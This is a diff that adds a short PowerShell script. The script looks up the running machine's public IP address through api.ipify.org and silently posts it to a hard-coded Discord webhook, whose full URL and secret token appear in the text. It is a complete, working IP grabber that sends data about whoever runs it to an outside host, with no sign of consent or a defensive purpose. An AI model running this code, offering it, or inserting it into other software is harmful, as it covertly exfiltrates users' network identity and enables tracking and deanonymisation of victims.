@@ -1,0 +1,8 @@
+$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+$webhookUrl = "https://discord.com/api/webhooks/1387178017864028291/V3T_UavjdBole1cspYNGu0_B6wHMrlfBLxqAI4RCOJ4uRTLbeo1vDLbCJSXKETXSAP1w"
+$body = @{
+    username = "Tralalelo Tralala"
+    avatar_url = "https://brainrotbuddies.com/cdn/shop/files/S4b65ba5915464bd0938622687a4384acl.webp"
+    content = "**Public IP:** ` $ip `	"
+} | ConvertTo-Json
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
